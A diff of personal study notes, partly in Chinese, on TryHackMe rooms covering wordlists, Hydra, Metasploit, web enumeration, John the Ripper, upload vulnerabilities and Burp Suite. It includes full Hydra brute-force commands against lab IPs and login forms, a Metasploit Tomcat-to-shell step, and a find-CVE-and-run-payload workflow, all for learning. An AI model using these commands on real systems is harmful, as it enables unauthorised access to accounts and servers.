@@ -1,4 +1,4 @@
-Wordllist : 
+## Wordllist : 
 	Subdomain:
 		--> /usr/share/dirb/wordlists/common.txt
 			=> big.txt |
@@ -12,8 +12,7 @@ Wordllist :
 		--> /home/kali/2024_5_CTF/wordlist/wordlist2.txt
 		--> /home/kali/2024_5_CTF/wordlist/10-million-password-list-top-100.txt
 		--> /usr/share/wordlists/fasttrack.txt
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~		
-ToolsRus	
+## ToolsRus	
 	https://tryhackme.com/r/room/toolsrus
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	=> 練習使用 dirbuster、Hydra、nmap、nikto 和 metasploit 等工具
@@ -35,8 +34,7 @@ ToolsRus
 			=> msfconsole 
 				> search tomcat
 				=> meterpreter > shell
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-hydra:	
+## hydra:	
 	--> http:
 		=> hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.157.59 http-get /protected
 		=> hydra -l -P <MACHINE_IP> http-post-form "<path>:<login_credentials>:<invalid_response>"
@@ -53,8 +51,7 @@ hydra:
 	
 	--> sudo hydra -s 8080 -l admin -P /usr/share/wordlists/rockyou.txt 10.10.173.192 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password" -f 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Web Enumeration : 
+## Web Enumeration : 
 	--> https://tryhackme.com/r/room/webenumerationv2
 		--> 手動枚舉 :
 			--> Viewing page source code
@@ -208,8 +205,7 @@ Web Enumeration :
 			--> shell :
 				--> Programming languages 
 		
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-John The Ripper :
+## John The Ripper :
 	--> https://tryhackme.com/r/room/johntheripper0
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> normal : 
@@ -286,8 +282,7 @@ John The Ripper :
 	Task : 
 		--> 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~	
-Upload Vulnerabilities	: 
+## Upload Vulnerabilities	: 
 	--> https://tryhackme.com/r/room/uploadvulns
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 	--> hosts file : https://www.ionos.co.uk/digitalguide/server/configuration/hosts-file/
@@ -425,8 +420,7 @@ Upload Vulnerabilities	:
 				=> BYL.jpg (389)
 				--> http://jewel.uploadvulns.thm/admin
 					=> ../content/BYL.jpg 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Vulnerability 101
+##  Vulnerability 101
 	--> type
 		--> Operating System		: 作業系統		=> 權限提升。
 		--> (Mis)Configuration-based	: 基於（錯誤）配置 	=> 暴露客戶詳細資訊的網站。
@@ -457,8 +451,7 @@ Upload Vulnerabilities	:
 		--> 4. Vulnerability Research
 			--> Remote Code Execution (RCE)
 		--> 5. Exploitation
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Exploit Vulnerability
+##  Exploit Vulnerability
 	--> 漏洞掃描器 Nessus : https://www.tenable.com/products/nessus
 		--> https://tryhackme.com/r/room/rpnessusredux
 		--> https://kali:8834/#/scans/folders/my-scans
@@ -484,15 +477,13 @@ Upload Vulnerabilities	:
 		--> download payload  --> use hint 
 		--> change IP /url / port 
 		--> -h | help
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Vulnerability Capstone (task)
+##  Vulnerability Capstone (task)
 	--> find app name and verion
 	--> go to Exploit-DB find cve 
 	--> search cve payload
 		--> chnage url ip
 		--> get flags
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
---> Burp Suite
+##  Burp Suite
 	--> Proxy
 		--> Intercept is on 
 	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
